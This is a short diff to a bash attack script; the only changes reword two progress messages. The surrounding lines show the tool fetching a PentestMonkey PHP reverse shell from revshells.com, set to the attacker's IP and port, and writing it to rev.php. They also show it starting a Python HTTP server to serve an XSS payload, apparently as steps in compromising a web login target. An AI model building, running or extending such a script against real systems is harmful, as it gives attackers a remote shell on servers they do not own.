@@ -18,7 +18,7 @@ HOST=$(echo $LOGIN_URL | awk -F/ '{print $3}')
 # Function to download reverse shell from revshells.com and create rev.php
 download_reverse_shell() {
   local revshell_url="https://www.revshells.com/PHP%20PentestMonkey?ip=$IP_ADDRESS&port=$PORT&shell=sh&encoding=sh"
-  echo "[1/5] Preparing to download the reverse shell zip file from: http://$IP_ADDRESS:8000/main.zip"
+  echo "[+] Preparing to download the reverse shell zip file from: http://$IP_ADDRESS:8000/main.zip"
   curl -s "$revshell_url" -o rev.php
   
   if [ -f rev.php ]; then
@@ -109,7 +109,7 @@ start_http_server() {
   fi
 
   # Start a new HTTP server and keep it running in the background
-  echo "[4/5] Starting a simple HTTP server to serve the XSS payload and it will be put to the background..."
+  echo "[+] Starting a simple HTTP server to serve the XSS payload and it will be put to the background..."
   python3 -m http.server $PORT &
   sleep 2
 }
